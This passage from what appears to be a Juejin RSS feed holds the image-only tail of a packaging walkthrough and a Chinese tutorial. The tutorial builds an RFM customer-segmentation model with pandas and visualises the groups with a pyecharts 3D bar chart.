<p>直接下一步</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/106ab1a946cd4ea5a280c7cd558f38b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=idERRWeW09J6Qvxo4XRvqcEU%2Bf4%3D" alt="" loading="lazy"/></p>
<ol start="4">
<li>第四步</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86f49c194bb64b90897fc6da8b6e51b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=lpmFPi0gtlYfvNfncNUgMOy%2Bnbk%3D" alt="" loading="lazy"/></p>
<ol start="5">
<li>第五步</li>
</ol>
<p>下面直接next 到下图</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d29ff41ba65740268ea0fa8b3b3aae9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=NJL8KPsQJSGxJ7yImDW0UU0e5AE%3D" alt="" loading="lazy"/></p>
<ol start="6">
<li>第六步</li>
</ol>
<p>见图</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2947904a975842e383ddad4b340a51b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=2Lc2RWbzrAJmrTFpKRpXXX2pCbs%3D" alt="" loading="lazy"/></p>
<p>修改脚本文件</p>
<p>原：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9810a5f90924d2ea33a3f2554c94d3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=oUtdxrYWGvPU4vwuYvdG1HrZ8zU%3D" alt="" loading="lazy"/></p>
<p>修改后：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06c00ed5ffd44f129375d81dd1018c90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=6tpXZwr5ZSCXeM8qaydDhigdDL8%3D" alt="" loading="lazy"/></p>
<ol start="7">
<li>第七步</li>
</ol>
<p>执行打包</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bff70114de347268d98e3caaddefb51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S55m96I-c:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765618033&amp;x-signature=MOmyIeZIOqTy32B%2FCslWeUDeBi4%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RFM 模型 项目实战]]></title>    <link>https://juejin.cn/post/7580287891272974399</link>    <guid>https://juejin.cn/post/7580287891272974399</guid>    <pubDate>2025-12-06T09:15:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580287891272974399" data-draft-id="7577307100129624114" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RFM 模型 项目实战"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-06T09:15:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哪里的破水瓶"/> <meta itemprop="url" content="https://juejin.cn/user/4394111849466414"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RFM 模型 项目实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4394111849466414/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哪里的破水瓶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:15:36.000Z" title="Sat Dec 06 2025 09:15:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读22分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"🕛";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1️⃣"}.markdown-body ol&gt;li:nth-child(2):before{content:"2️⃣"}.markdown-body ol&gt;li:nth-child(3):before{content:"3️⃣"}.markdown-body ol&gt;li:nth-child(4):before{content:"4️⃣"}.markdown-body ol&gt;li:nth-child(5):before{content:"5️⃣"}.markdown-body ol&gt;li:nth-child(6):before{content:"6️⃣"}.markdown-body ol&gt;li:nth-child(7):before{content:"7️⃣"}.markdown-body ol&gt;li:nth-child(8):before{content:"8️⃣"}.markdown-body ol&gt;li:nth-child(9):before{content:"9️⃣"}.markdown-body ol&gt;li:nth-child(10):before{content:"🔟"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"🔹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>RFM 模型是一种常用于<strong>客户细分与营销分析</strong>的模型，特别是在<strong>电子商务、市场营销和用户分析</strong>中广泛应用。RFM 代表的是**Recency（最近一次购买时间）、Frequency（购买频率）和Monetary（消费金额）**这三个指标，用来衡量客户行为并帮助企业制定针对性的营销策略。</p>
<h4 data-id="heading-0">RFM 模型的核心思想</h4>
<p>通过对客户的购买行为进行分析，将客户按<strong>最近一次购买时间、购买频率和消费金额</strong>三个维度进行分组，从而识别出<strong>高价值客户</strong>、<strong>潜在客户</strong>、<strong>流失客户</strong>等群体，帮助企业在不同的客户群体中制定个性化的营销策略。</p>
<h4 data-id="heading-1">具体的三个维度</h4>
<ol>
<li><strong>Recency（R）最近一次购买时间</strong>
<ul>
<li><strong>定义</strong>：客户上次购买的时间距离当前有多久。</li>
<li><strong>意义</strong>：最近购买的客户可能对品牌更感兴趣，可能是活跃客户。</li>
<li><strong>如何计算</strong>：可以根据当前日期减去客户上次购买的日期，得到的天数越小，说明客户越活跃。</li>
</ul>
</li>
<li><strong>Frequency（F）购买频率</strong>
<ul>
<li><strong>定义</strong>：客户在一定时间内购买的次数。</li>
<li><strong>意义</strong>：购买频率高的客户通常是忠实客户，可能具有较高的品牌粘性。</li>
<li><strong>如何计算</strong>：在一定时间内（例如：过去 6 个月内）客户的购买次数。</li>
</ul>
</li>
<li><strong>Monetary（M）消费金额</strong>
<ul>
<li><strong>定义</strong>：客户在一定时间内的总消费金额。</li>
<li><strong>意义</strong>：消费金额高的客户通常是高价值客户，企业应该重点关注。</li>
<li><strong>如何计算</strong>：在一定时间内（例如：过去 6 个月）客户的累计消费金额。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-2">RFM 模型的应用步骤</h4>
<ol>
<li><strong>数据收集</strong>：首先收集客户的历史购买数据，包括每次购买的时间、金额、次数等信息。</li>
<li><strong>数据处理与计算</strong>：根据数据计算每个客户的 R、F、M 三个指标。
<ul>
<li><strong>Recency</strong>：计算当前时间与客户最近一次购买的时间差。</li>
<li><strong>Frequency</strong>：计算客户在一定时间内的购买次数。</li>
<li><strong>Monetary</strong>：计算客户在一定时间内的总消费金额。</li>
</ul>
</li>
<li><strong>客户分群</strong>：根据 R、F、M 的值将客户进行分组。通常使用<strong>量化打分</strong>的方法，将每个指标分为几个等级（如：高、中、低）。
<ul>
<li><strong>Recency</strong>：时间越近，分数越高。</li>
<li><strong>Frequency</strong>：购买频率越高，分数越高。</li>
<li><strong>Monetary</strong>：消费金额越高，分数越高。</li>
</ul>
</li>
<li><strong>营销策略</strong>：根据不同的客户分群，制定相应的营销策略：
<ul>
<li><strong>高 R、F、M</strong>：忠诚客户，可以发送定制的优惠券、会员福利等，保持他们的活跃度。</li>
<li><strong>高 R，低 F 和 M</strong>：新客户或潜在客户，需要通过邮件、推送等方式进行培养，提高频次和金额。</li>
<li><strong>低 R，低 F 和 M</strong>：流失客户，可能需要通过重新激活的策略（如限时优惠、促销活动等）来恢复关系。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">数据预处理</h3>
<p>在一个excel文件中，有多个表格。如何一次性加载多个工作表，此时如下，会报错，需要用到 <code>openpyxl</code> 库。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment">## pip install openpyxl</span>
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
sheet_names = [<span class="hljs-string">'2015'</span>, <span class="hljs-string">'2016'</span>, <span class="hljs-string">'2017'</span>, <span class="hljs-string">'2018'</span>, <span class="hljs-string">'会员等级'</span>]
sheet_dicts = pd.read_excel(<span class="hljs-string">'./sales.xlsx'</span>, sheet_name=sheet_names)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(sheet_dicts)) <span class="hljs-comment"># 是字典类型</span>
sheet_dicts[<span class="hljs-string">'2015'</span>] <span class="hljs-comment"># 获取2015年的数据</span>
</code></pre>
<blockquote>
<p>排除无效值和空值</p>
</blockquote>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sheet_names[:-<span class="hljs-number">1</span>]:
    <span class="hljs-comment"># 删除缺失值</span>
    sheet_dicts[i] = sheet_dicts[i].dropna()
    <span class="hljs-comment"># 过滤掉余额过低的</span>
    sheet_dicts[i] = sheet_dicts[i][sheet_dicts[i][<span class="hljs-string">'订单金额'</span>] &gt; <span class="hljs-number">1</span>]
    <span class="hljs-comment"># 新增一列，表示固定时间</span>
    sheet_dicts[i][<span class="hljs-string">'max_year_date'</span>] = sheet_dicts[i][<span class="hljs-string">'提交日期'</span>].<span class="hljs-built_in">max</span>()
</code></pre>
<blockquote>
<p>合并值</p>
</blockquote>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># 合并数据集</span>
<span class="hljs-comment"># 将前四个表的数据，拼接成 dataFrame</span>
data_merge = pd.concat(<span class="hljs-built_in">list</span>(sheet_dicts.values())[:-<span class="hljs-number">1</span>], ignore_index=<span class="hljs-literal">True</span>)
<span class="hljs-comment"># 给表新增一列，表示年</span>
data_merge[<span class="hljs-string">'year'</span>] = data_merge[<span class="hljs-string">'max_year_date'</span>].dt.year
<span class="hljs-comment"># 间隔时间</span>
data_merge[<span class="hljs-string">'data_interval'</span>] = data_merge[<span class="hljs-string">'max_year_date'</span>] - data_merge[<span class="hljs-string">'提交日期'</span>]
<span class="hljs-comment"># 把间隔时间变成天数</span>
data_merge[<span class="hljs-string">'data_interval'</span>] = data_merge[<span class="hljs-string">'data_interval'</span>].dt.days
</code></pre>
<blockquote>
<p>聚合运行，计算统计信息</p>
</blockquote>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># 按照 year 和 会员ID分组，分别计算（r 最近购买时间）f(频次) m(金额)三项</span>
rmf_fb = data_merge.groupby([<span class="hljs-string">'year'</span>, <span class="hljs-string">'会员ID'</span>], as_index=<span class="hljs-literal">False</span>).agg(
    r=(<span class="hljs-string">'data_interval'</span>, <span class="hljs-string">'min'</span>),
    f=(<span class="hljs-string">'订单号'</span>, <span class="hljs-string">'count'</span>),
    m=(<span class="hljs-string">'订单金额'</span>, <span class="hljs-string">'sum'</span>)
)
</code></pre>
<h4 data-id="heading-4">规则约束，数据处理</h4>
<p>我们往往会根据实际的场景，做一些限制。叫做定义边界。已知</p>
<ul>
<li>r和m的数据分布相对较为离散，表现在min、25%、50%、75%和max的数据没有特别集中</li>
<li>大部分用户的分布都趋近于1，表现是从min到75%的分段值都是1且mean（均值）才为1.365</li>
<li>计划选择25%和75%作为区间划分的2个边界值</li>
<li>与业务部门沟通，划分时可以使用2和5来作为边界</li>
<li>业务部门认为当年购买&gt;=2次可被定义为复购用户（而非累计订单的数量计算复购用户）</li>
<li>业务部门认为普通用户购买5次已经是非常高的次数，超过该次数就属于非常高价值用户群体</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9a89804cb514162a8eaf0ed326c94c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617788&amp;x-signature=9quar5bYj47iInWA77uRV4K2Tl0%3D" alt="image.png" loading="lazy"/>
此时设计，已知 R为，0，79，255，365。 百分之50 不在规则里。</p>
<p>为了使，0~1 的数据也能被正常，设置为，-1，并不是真的有负数，只是为了能包含0左右的数据。所以结果为，-1，79，255，365。</p>
<p>第二组数据，是f表示频率，规则里也说了，采用，2，5法。原值为，1，1，1，130。定义边界后，0，2，5，130.</p>
<p>第三组，没有限制，全包了就可以，定义前，1.5,69.0,189.0,1199.0,206251.8
定义后 0, 69, 1199, 206252</p>
<p>问题就来了，究竟什么时候才能加 -1呢？这就要看第一个区间了。
由图得知，第一个区间是，79~156，那么包含 min 的值 0 吗？肯定是不包含了啊，所以需要加。第二个f，肯定不会了，第三个加 0 就可以了。</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># 自定义区间</span>
r_bins = [-<span class="hljs-number">1</span>, <span class="hljs-number">79</span>, <span class="hljs-number">255</span>, <span class="hljs-number">365</span>]
f_bins = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">130</span>]
m_bins = [<span class="hljs-number">0</span>, <span class="hljs-number">69</span>, <span class="hljs-number">1199</span>, <span class="hljs-number">206252</span>]

<span class="hljs-comment"># 自动划分区间，给点区间数，由 pandas 进行具体划分</span>
pd.cut(rmf_fb[<span class="hljs-string">'r'</span>], bins=<span class="hljs-number">3</span>).unique()
<span class="hljs-comment"># [(121.667, 243.333], (243.333, 365.0], (-0.365, 121.667]]</span>
<span class="hljs-comment"># Categories (3, interval[float64, right]): [(-0.365, 121.667] &lt; (121.667, 243.333] &lt; (243.333, 365.0]]</span>

<span class="hljs-comment"># 自定义区间。include_lowest=True 参数可以包左。</span>
pd.cut(rmf_fb[<span class="hljs-string">'r'</span>], bins=r_bins).unique()
<span class="hljs-comment"># [(79, 255], (255, 365], (-1, 79]]</span>
<span class="hljs-comment"># Categories (3, interval[int64, right]): [(-1, 79] &lt; (79, 255] &lt; (255, 365]]</span>

<span class="hljs-comment"># 自定义区间 + 评分，会根据每一组进行评分。比如，-1~79，第一组，结果是3.</span>
pd.cut(rmf_fb[<span class="hljs-string">'r'</span>], bins=r_bins, labels=[<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>])
</code></pre>
<blockquote>
<p>完整，项目完整代码继续</p>
</blockquote>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># 自定义区间</span>
r_bins = [-<span class="hljs-number">1</span>, <span class="hljs-number">79</span>, <span class="hljs-number">255</span>, <span class="hljs-number">365</span>]
f_bins = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">130</span>]
m_bins = [<span class="hljs-number">0</span>, <span class="hljs-number">69</span>, <span class="hljs-number">1199</span>, <span class="hljs-number">206252</span>]

<span class="hljs-comment"># 自定义区间 + 评分，R是最后一次购买时间，越小越好，评分是3，2，1</span>
rmf_fb[<span class="hljs-string">'r_label'</span>] = pd.cut(rmf_fb[<span class="hljs-string">'r'</span>], bins=r_bins, labels=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r_bins) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>)])
<span class="hljs-comment"># F是购买频率，越大越好，评分是，1，2，3</span>
rmf_fb[<span class="hljs-string">'f_label'</span>] = pd.cut(rmf_fb[<span class="hljs-string">'f'</span>], bins=f_bins, labels=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(f_bins))])
<span class="hljs-comment"># M是购买金额，越大越好，评分是，1，2，3</span>
rmf_fb[<span class="hljs-string">'m_label'</span>] = pd.cut(rmf_fb[<span class="hljs-string">'m'</span>], bins=m_bins, labels=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(m_bins))])
</code></pre>
<h4 data-id="heading-5">评分加权</h4>
<p>我们计算出来了结果，希望对三项进行合并成一个字段。</p>
<p>思路1：r_label * 权重 + f_label * 权重 + m_label * 权重</p>
<p>思路2：拼接思路，即全部相加，不需要 * 权重</p>
<pre><code class="hljs language-py" lang="py">rmf_fb[<span class="hljs-string">'r_label'</span>] = rmf_fb[<span class="hljs-string">'r_label'</span>].astype(<span class="hljs-built_in">str</span>)
rmf_fb[<span class="hljs-string">'f_label'</span>] = rmf_fb[<span class="hljs-string">'f_label'</span>].astype(<span class="hljs-built_in">str</span>)
rmf_fb[<span class="hljs-string">'m_label'</span>] = rmf_fb[<span class="hljs-string">'m_label'</span>].astype(<span class="hljs-built_in">str</span>)
rmf_fb[<span class="hljs-string">'rfm_group'</span>] = rmf_fb[<span class="hljs-string">'r_label'</span>] + rmf_fb[<span class="hljs-string">'f_label'</span>] + rmf_fb[<span class="hljs-string">'m_label'</span>]
</code></pre>
<h4 data-id="heading-6">数据保存</h4>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine
<span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine

<span class="hljs-comment"># 保存到xlsx</span>
rmf_fb.to_excel(<span class="hljs-string">'./rfm结果.xlsx'</span>, index=<span class="hljs-literal">False</span>)
<span class="hljs-comment"># 保存到mysql</span>
engin = create_engine(<span class="hljs-string">'mysql+pymysql://root:123456@localhost:3306/demo?charset=utf8'</span>)
rmf_fb.to_sql(<span class="hljs-string">'demo'</span>, engin, if_exists=<span class="hljs-string">'replace'</span>, index=<span class="hljs-literal">False</span>)
</code></pre>
<h4 data-id="heading-7">数据可视化，3D 柱状图</h4>
<p>数据处理，统计分析</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># 1. 安装用户类型，年份分组，统计会议总数</span>
<span class="hljs-comment"># 思路1. value_counts()</span>
<span class="hljs-comment"># rmf_fb.groupby(['rfm_group', 'year'])['会员ID'].value_counts()</span>

<span class="hljs-comment"># 思路2. groupby + 聚合函数</span>
display_data = rmf_fb.groupby([<span class="hljs-string">'rfm_group'</span>, <span class="hljs-string">'year'</span>], as_index=<span class="hljs-literal">False</span>).agg(
    number=(<span class="hljs-string">'会员ID'</span>, <span class="hljs-string">'count'</span>)
)
<span class="hljs-comment"># 修改字段类型</span>
display_data[<span class="hljs-string">'rfm_group'</span>] = display_data[<span class="hljs-string">'rfm_group'</span>].astype(<span class="hljs-built_in">int</span>)
</code></pre>
<p>执行完下面的代码，会生成一个html，可以打开查看</p>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> pyecharts.charts <span class="hljs-keyword">import</span> Bar3D
<span class="hljs-keyword">import</span> pyecharts.options <span class="hljs-keyword">as</span> opts

<span class="hljs-comment"># 显示图形</span>
<span class="hljs-comment"># 颜色池</span>
range_color = [<span class="hljs-string">'#313695'</span>, <span class="hljs-string">'#4575b4'</span>, <span class="hljs-string">'#74add1'</span>, <span class="hljs-string">'#abd9e9'</span>, <span class="hljs-string">'#e0f3f8'</span>, <span class="hljs-string">'#ffffbf'</span>,
               <span class="hljs-string">'#fee090'</span>, <span class="hljs-string">'#fdae61'</span>, <span class="hljs-string">'#f46d43'</span>, <span class="hljs-string">'#d73027'</span>, <span class="hljs-string">'#a50026'</span>]

range_max = <span class="hljs-built_in">int</span>(display_data[<span class="hljs-string">'number'</span>].<span class="hljs-built_in">max</span>())
c = (
    Bar3D()<span class="hljs-comment">#设置了一个3D柱形图对象</span>
    .add(
        <span class="hljs-string">""</span>,<span class="hljs-comment">#图例</span>
        [d.tolist() <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> display_data.values],<span class="hljs-comment">#数据</span>
        xaxis3d_opts=opts.Axis3DOpts(type_=<span class="hljs-string">"category"</span>, name=<span class="hljs-string">'分组名称'</span>),<span class="hljs-comment">#x轴数据类型，名称，rfm_group</span>
        yaxis3d_opts=opts.Axis3DOpts(type_=<span class="hljs-string">"category"</span>, name=<span class="hljs-string">'年份'</span>),<span class="hljs-comment">#y轴数据类型，名称，year</span>
        zaxis3d_opts=opts.Axis3DOpts(type_=<span class="hljs-string">"value"</span>, name=<span class="hljs-string">'会员数量'</span>),<span class="hljs-comment">#z轴数据类型，名称，number</span>
    )
    .set_global_opts( <span class="hljs-comment"># 全局设置</span>
        visualmap_opts=opts.VisualMapOpts(max_=range_max, range_color=range_color), <span class="hljs-comment">#设置颜色，及不同取值对应的颜色</span>
        title_opts=opts.TitleOpts(title=<span class="hljs-string">"RFM分组结果"</span>),<span class="hljs-comment">#设置标题</span>
    )
)
c.render() 		      <span class="hljs-comment">#数据保存到本地的网页中.</span>
<span class="hljs-comment"># c.render_notebook() #在notebook中显示</span>
</code></pre>
